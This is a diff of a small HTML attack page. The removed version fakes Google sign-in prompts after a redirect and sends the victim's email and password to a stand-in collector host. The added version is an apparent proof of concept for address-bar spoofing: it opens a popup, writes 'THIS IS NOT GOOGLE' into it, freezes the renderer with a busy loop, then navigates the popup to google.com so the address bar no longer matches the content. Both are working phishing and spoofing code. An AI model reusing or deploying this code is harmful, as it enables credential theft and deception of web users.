@@ -1,50 +1,66 @@
-<!DOCTYPE html>
-<html lang="id">
+<!doctype html>
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>Home</title>
-<style>
-  body {
-    margin: 0; height: 100vh;
-    display: flex; align-items: center; justify-content: center;
-    font-family: system-ui, sans-serif;
-  }
-  #go {
-    font-size: 20px; padding: 12px 48px;
-    border: 2px solid #333; border-radius: 8px; cursor: pointer;
-  }
-</style>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>tester</title>
+  <style>
+    body, html { margin: 0; padding: 0; height: 100%; background: #fff; }
+    button {
+      position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+      padding: 15px 30px; font-size: 18px; background: #007aff; color: #fff;
+      border: none; border-radius: 10px; cursor: pointer;
+    }
+  </style>
 </head>
 <body>
+  <button id="startBtn">CLICK HERE</button>
 
-<button id="go">GO</button>
+  <script>
+    document.getElementById("startBtn").onclick = function () {
+      this.remove();
 
-<script>
-document.getElementById("go").addEventListener("click", function () {
-  // navigasi dimulai sekarang...
-  window.location.href = "https://www.google.com";
+      // 1) user-gesture popup — popup blocker aman karena masih dalam gesture
+      const w = window.open("about:blank", "_blank");
+      if (!w) { alert("popup diblokir"); return; }
 
-  // ...tapi dialog di-schedule SETELAH redirect, biar muncul nimpa di google.com
-  //    (butuh window timing: dialog jalan ketika dokumen lama masih pending)
-  setTimeout(askCreds, 800);
-});
+      // 2) isi konten attacker di tab baru
+      w.document.write(`
+        <!DOCTYPE html>
+        <html>
+        <head><title>tester</title></head>
+        <body style="margin:0;padding:0;background:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center">
+          <div>
+            <h1 style="font-size:64px;font-weight:bold;color:red;margin:0 0 30px 0">THIS IS NOT GOOGLE</h1>
+            <p style="font-size:40px;font-weight:bold;color:#007aff;margin:20px 0">STALE RENDER + OMNIBOX DESYNC PoC</p>
+          </div>
+        </body>
+        </html>
+      `);
+      w.document.close();
 
-function askCreds() {
-  // prompt() = dialog bawaan browser, satu field input
-  var email = prompt("google.com\n\nSign in to continue\n\nEmail:", "");
+      // 3) flush renderer pakai workload sinkron berat (jangan pakai prompt/alert
+      //    — di Android background-tab dialog sering di-suppress)
+      setTimeout(function () {
+        w.document.title = "busy";
+        const blob = new Blob(
+          [new ArrayBuffer(48 * 1024 * 1024)], // 48 MB — sesuaikan 24–96 MB
+          { type: "application/octet-stream" }
+        );
+        const img = new Image();
+        const ctx = new OffscreenCanvas(4096, 4096).getContext("2d");
+        const start = performance.now();
+        while (performance.now() - start < 20000) { // blok ~20 detik
+          ctx.fillRect(0, 0, 4096, 4096);
+          ctx.clearRect(0, 0, 4096, 4096);
+        }
+      }, 50);
 
-  if (email === null) return; // user klik Cancel
-
-  var pass = prompt("google.com\n\nPassword for " + email + ":", "");
-  if (pass === null) return;
-
-  // exfil — request gambar bebas CORS & tidak kelihatan di console
-  if (email && pass) {
-    new Image().src = "https://kolektor-lu.example/log?u=" +
-      encodeURIComponent(email) + "&p=" + encodeURIComponent(pass);
-  }
-}
-</script>
-
+      // 4) commit navigasi ke target — omnibox pindah, renderer lama masih hang
+      setTimeout(function () {
+        w.location.href = "https://www.google.com";
+      }, 300);
+    };
+  </script>
 </body>
 </html>
